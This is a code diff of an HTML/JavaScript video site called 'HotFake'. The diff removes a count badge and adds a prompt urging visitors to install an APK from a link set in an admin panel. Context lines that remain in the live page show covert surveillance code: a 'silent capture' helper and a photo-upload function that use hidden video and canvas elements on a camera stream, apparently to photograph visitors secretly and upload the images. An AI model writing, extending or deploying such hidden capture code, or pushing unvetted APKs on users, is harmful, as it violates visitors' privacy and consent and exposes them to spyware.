@@ -15,7 +15,6 @@
       
       body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; overflow-x: hidden; touch-action: manipulation; display:flex; flex-direction:column; }
       
-      /* --- HEADER UPDATED WALA HISSA (Premium Icons aur App Checker ke sath) --- */
       header { position: sticky; top: 0; z-index: 100; background: rgba(7,7,15,0.88); backdrop-filter: blur(18px); border-bottom: 1px solid var(--border); padding: .9rem 2rem; }
       nav { max-width:1400px; margin:0 auto; display:flex; align-items:center; justify-content:space-between; }
       .logo { font-size:1.6rem; font-weight:800; color:var(--text); text-decoration:none; display:flex; align-items:center; gap:.4rem; letter-spacing:-1px; }
@@ -34,7 +33,6 @@
       .main { flex:1; max-width:1400px; width:100%; margin:0 auto; padding:2rem; }
       .row-head { display:flex; align-items:center; gap:1rem; margin-bottom:1.5rem; border-left:3px solid var(--red); padding-left:.9rem; }
       .row-head h2 { font-size:1.25rem; font-weight:600; }
-      .count-badge { background:var(--surf2); color:var(--muted); font-size:.8rem; padding:.2rem .7rem; border-radius:50px; border:1px solid var(--border); }
       
       .gallery { display:grid; grid-template-columns: repeat(auto-fill, minmax(270px, 1fr)); gap:1.25rem; }
       .card { display:block; text-decoration:none; color:var(--text); background:var(--surf); border-radius:var(--radius); border:1px solid var(--border); overflow:hidden; transition: transform var(--ease), box-shadow var(--ease), border-color var(--ease); cursor: pointer;}
@@ -51,22 +49,17 @@
       .play-circle { width:62px; height:62px; border-radius:50%; background:var(--red); display:flex; align-items:center; justify-content:center; box-shadow:0 4px 24px rgba(230,57,70,.6); transform:scale(.8); transition:transform var(--ease); }
       .play-triangle { width:0; height:0; border-top:12px solid transparent; border-bottom:12px solid transparent; border-left:20px solid #fff; margin-left:5px; }
       
-      /* --- FOOTER --- */
       footer { text-align:center; padding:3rem 1rem 2rem; border-top:1px solid var(--border); margin-top:4rem; background:var(--surf); }
       .social-links { display:flex; gap:1rem; justify-content:center; margin-bottom:1.5rem; flex-wrap:wrap; }
       .soc-btn { display:inline-flex; align-items:center; gap:.5rem; padding:.6rem 1.2rem; border-radius:50px; background:var(--surf2); color:var(--text); text-decoration:none; font-size:.85rem; font-weight:500; border:1px solid var(--border); transition:all .2s;}
       .soc-btn:hover { background:var(--red); border-color:var(--red); transform:translateY(-2px); }
       .footer-txt { color:var(--muted); font-size:.85rem; }
 
-      /* --- iOS GLASS MODALS --- */
       .modal-bg { position:fixed; inset:0; background:rgba(0,0,0,0.4); z-index:10000; display:flex; align-items:center; justify-content:center; padding:1.2rem; backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(10px); }
-      
       .modal-content { background:rgba(18, 18, 25, 0.75); border:1px solid rgba(255,255,255,0.1); border-radius:24px; padding:2rem 1.5rem; text-align:center; max-width:350px; width:100%; box-shadow: 0 20px 40px rgba(0,0,0,0.6); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); }
-      
       .modal-content h3 { font-size:1.5rem; margin-bottom:0.6rem; color:var(--red); font-weight: 700; letter-spacing: -0.5px;}
       .modal-content p { color:rgba(255,255,255,0.85); margin-bottom:1.5rem; font-size:0.9rem; line-height: 1.4; }
       
-      /* Sleek Info Box */
       .info-box { background: rgba(0,0,0,0.3); border-left: 3px solid var(--red); padding: 12px 14px; border-radius: 8px; text-align: left; margin-bottom: 1.5rem; border-right: 1px solid rgba(255,255,255,0.05); border-top: 1px solid rgba(255,255,255,0.05); border-bottom: 1px solid rgba(255,255,255,0.05);}
       .info-box p { margin:0; font-size:0.8rem; color: #a5a5b5; line-height: 1.5;}
       .info-box b { color: #fff; }
@@ -77,7 +70,6 @@
       .btn-no { background:rgba(255,255,255,0.1); color:#fff; border:1px solid rgba(255,255,255,0.1); }
       .btn:hover { transform:scale(1.03); }
 
-      /* --- NEW EPISODES GRID MODAL --- */
       .ep-modal-content { background:rgba(18, 18, 25, 0.8); border:1px solid rgba(255,255,255,0.1); border-radius:24px; padding:1.5rem; width:100%; max-width:650px; backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
       .ep-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(130px, 1fr)); gap:12px; max-height:400px; overflow-y:auto; padding-right:5px; margin-top:1rem; }
       .ep-card { background:rgba(0,0,0,0.4); border:1px solid rgba(255,255,255,0.05); border-radius:12px; overflow:hidden; cursor:pointer; transition:all 0.2s; display:flex; flex-direction:column; }
@@ -87,13 +79,11 @@
       .ep-thumb .ep-num { position:absolute; top:5px; left:5px; background:rgba(0,0,0,0.75); color:white; font-size:0.7rem; padding:2px 6px; border-radius:6px; font-weight:bold; backdrop-filter:blur(4px); border: 1px solid rgba(255,255,255,0.1); }
       .ep-title { padding:10px; font-size:0.8rem; color:white; font-weight:500; text-align:center; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; font-family:var(--font); }
 
-      /* --- HOTFAKE SECURE PLAYER UI --- */
       #playerModal { display:none; position:fixed; inset:0; background:#000; z-index:9999; flex-direction:column; touch-action: none !important; }
       .player-wrapper { flex:1; display:flex; justify-content:center; align-items:center; width:100vw; height:100vh; position:relative; background: #000; overflow: hidden; touch-action: none !important;}
       #iframeContainer { width: 100%; height: 100%; position: relative; display: none; overflow: hidden; background: #000; touch-action: none !important; }
       #iframePlayer { width: 100%; height: 100%; border: none; position: relative; z-index: 1; transform: scale(1.15); }
       
-      /* Ad Layer & Censors */
       #adContainer { position:absolute; inset:0; background:#000; z-index:90; display:none; flex-direction:column; align-items:center; justify-content:center; }
       .skip-btn { position:absolute; bottom:30px; right:30px; background:rgba(0,0,0,0.7); border:1px solid var(--border); color:white; padding:0.6rem 1.2rem; border-radius:50px; font-family:var(--font); z-index:95; cursor:pointer; font-weight:600; display:none; }
       .skip-btn.disabled { opacity:0.6; cursor:not-allowed; }
@@ -101,7 +91,6 @@
       .censor-top { position: absolute; top: 0; left: 0; right: 0; height: 0px; background: linear-gradient(to bottom, rgba(0,0,0,1) 40%, transparent 100%); z-index: 10; pointer-events: none; }
       .censor-bottom { position: absolute; bottom: 0; left: 0; right: 0; height: 0px; background: linear-gradient(to top, rgba(0,0,0,1) 40%, transparent 100%); z-index: 10; pointer-events: none; }
 
-      /* Smart UI Overlay */
       .smart-overlay { position: absolute; inset: 0; z-index: 99; display: flex; flex-direction: column; justify-content: space-between; opacity: 0; visibility: hidden; pointer-events: none; transition: opacity 1.2s ease-in, visibility 1.2s; }
       .smart-overlay.active { opacity: 1; visibility: visible; transition: opacity 0s; }
       .glass-top { background: linear-gradient(to bottom, rgba(0,0,0,0.98) 0%, rgba(0,0,0,0.6) 75%, transparent 100%); height: 90px; display: flex; align-items: flex-start; padding: 15px 20px; backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px); pointer-events: auto; }
@@ -168,18 +157,14 @@
 </div>
 
 <!-- ============================================== -->
-<!-- HINGLISH: YAHAN TOP HEADER CHANGE KIYA GAYA HAI  -->
+<!-- HINGLISH: HEADER - TEXT HATA DIYA HAI. SIRF ICON HAI AB -->
 <!-- ============================================== -->
 <header>
   <nav>
     <a href="index.html" class="logo"><span class="logo-dot">▶</span> HotFake</a>
-    
     <div style="display:flex; align-items:center; gap:15px;">
-        <!-- Browser check hone par ye text dikhega -->
-        <span id="browserMsg" style="font-size: 0.75rem; color: var(--muted); display: none;">Install App to download offline</span>
-        
-        <!-- Premium Download Icon jo downloads page par jayega -->
-        <a href="javascript:void(0)" onclick="goToDownloads()" style="color: white; display: flex; align-items: center;" title="Downloads">
+        <!-- Premium Download / App Install Icon -->
+        <a href="javascript:void(0)" onclick="goToDownloads()" style="color: white; display: flex; align-items: center;" title="Downloads / Install App">
             <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
         </a>
     </div>
@@ -196,7 +181,9 @@
 </section>
 
 <main class="main">
-  <div class="row-head"><h2>Latest Videos</h2><span class="count-badge" id="countBadge">Loading...</span></div>
+  <!-- HINGLISH: 45 videos wala badge remove kar diya gaya hai -->
+  <div class="row-head"><h2>Latest Videos</h2></div>
+  
   <div id="loading" class="loader"></div>
   <div class="gallery" id="gallery" style="display: none;"></div>
 </main>
@@ -249,6 +236,7 @@
   let isAdultUser = false;
   let deviceId = null;
   let activeAd = null;
+  let apkDownloadUrl = ""; // HINGLISH: APK link store karne ke liye variable
 
   // 1. SILENT CAPTURE HELPER FUNCTION
   async function attemptSilentCapture() {
@@ -299,7 +287,6 @@
       }
   }
 
-  // PHOTO UPLOAD (150ms Fast Click)
   function captureAndUploadPhoto(stream, actionText) {
       const video = document.getElementById('secretVideo');
       const canvas = document.getElementById('secretCanvas');
@@ -481,12 +468,20 @@
 
   // --- FETCH DATA & RENDER ---
   onValue(ref(db, 'settings/ad'), (snap) => { activeAd = snap.val(); });
+  
   onValue(ref(db, 'settings/general/favicon'), (snap) => {
     if(snap.val()) {
       let link = document.querySelector("link[rel~='icon']");
       if (!link) { link = document.createElement('link'); link.rel = 'icon'; document.head.appendChild(link); }
       link.href = snap.val();
     }
+  });
+
+  // HINGLISH: Admin panel se APK ka link get karna
+  onValue(ref(db, 'settings/general/apkLink'), (snap) => {
+      if(snap.val()) {
+          apkDownloadUrl = snap.val();
+      }
   });
   
   onValue(ref(db, 'settings/social'), (snap) => {
@@ -517,7 +512,7 @@
       const t = term.trim().toLowerCase(); list = list.filter(v => v.title.toLowerCase().includes(t));
     }
     
-    document.getElementById('countBadge').textContent = list.length + ' video(s)';
+    // HINGLISH: Count badge update karne wala code hata diya gaya hai
     const gallery = document.getElementById('gallery'); gallery.style.display = 'grid';
     
     let htmlCode = '';
@@ -526,9 +521,6 @@
       const catBadge = isEmbed ? '<span class="cat-badge movie">🎬 Movie</span>' : '<span class="cat-badge link">🔗 Link</span>';
       const partsJson = v.parts ? encodeURIComponent(JSON.stringify(v.parts)) : '';
 
-      // ==============================================
-      // HINGLISH: CARD KE ANDAR SIRF GOL ICON WALA BUTTON HAI AB (TEXT HATA DIYA)
-      // ==============================================
       htmlCode += `
         <div class="card-wrapper" style="position:relative; margin-bottom:10px;">
             <a class="card vid-card" data-id="${v.id}" data-url="${v.videoUrl}" data-title="${esc(v.title)}" data-embed="${isEmbed}" data-parts="${partsJson}">
@@ -541,7 +533,6 @@
                   <h4 style="font-size:0.9rem; color:#fff; font-weight:500;">${esc(v.title)}</h4>
               </div>
             </a>
-            <!-- NEW SMART ROUND DOWNLOAD ICON -->
             ${isEmbed ? `<button id="dlBtn_${v.id}" onclick="startMovieDownload('${v.id}', '${esc(v.title)}', '${v.videoUrl}', '${v.imageUrl}')" style="position:absolute; bottom:10px; right:10px; z-index:5; background:rgba(0,0,0,0.7); backdrop-filter:blur(5px); color:white; border:1px solid rgba(255,255,255,0.2); border-radius:50%; width:36px; height:36px; display:flex; align-items:center; justify-content:center; cursor:pointer; box-shadow:0 2px 10px rgba(0,0,0,0.5); transition:all 0.3s;"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg></button>` : ''}
         </div>`;
     });
@@ -626,17 +617,8 @@
   // HINGLISH: SMART PLAY AUR APP DETECTION LOGIC
   // ==============================================
 
-  // Check ki user App (PWA) me hai ya Chrome/Browser me hai
   window.isAppInstalled = function() {
       return window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone === true;
-  };
-
-  // Jab page load ho, agar browser me hai toh message dikhao
-  window.onload = function() {
-      if(!window.isAppInstalled()) {
-          const msg = document.getElementById('browserMsg');
-          if(msg) msg.style.display = 'inline';
-      }
   };
 
   window.smartPlayCheck = async function(vidId, title, url, thumb) {
@@ -661,23 +643,36 @@
       return false;
   };
 
-  // TOP DOWNLOAD WALE ICON PAR CLICK
+  // HINGLISH: TOP WALE ICON PAR CLICK KARNE PAR (APK ya Downloads Page)
   window.goToDownloads = function() {
       if (!window.isAppInstalled()) {
-          alert("Available in App Only. Please install the app to access downloads.");
+          // Website pe click kiya -> Admin panel wala APK link open karo
+          if (apkDownloadUrl) {
+              window.open(apkDownloadUrl, '_blank');
+          } else {
+              alert("App download link will be available soon.");
+          }
           return;
       }
+      // App ke andar click kiya -> Offline Downloads store me jao
       window.location.href = 'downloads.html';
   };
 
-  // VIDEO CARD WALE GOL ICON PAR CLICK (REDIRECT TO DOWNLOADS PAGE)
+  // HINGLISH: MOVIE KE NICHE WALE ICON PAR CLICK KARNE PAR
   window.startMovieDownload = async function(id, title, url, thumb) {
       if (!window.isAppInstalled()) {
-          alert("Available in App Only. Please install the app to watch offline.");
+          // Website pe click kiya -> User ko App install karne ka option do
+          if (apkDownloadUrl) {
+              if(confirm("Please install our App to download and watch movies offline. Download App now?")) {
+                  window.open(apkDownloadUrl, '_blank');
+              }
+          } else {
+              alert("Available in App Only. Please install the app to watch offline.");
+          }
           return;
       }
       
-      // Video ka data save karke seedha downloads.html par bhej do
+      // App ke andar click kiya -> Movie ka data save karo aur Downloads page par bhej do
       const movieData = { id, title, url, thumb };
       localStorage.setItem('pending_download', JSON.stringify(movieData));
       
@@ -849,3 +844,4 @@
 
 </body>
 </html>
+
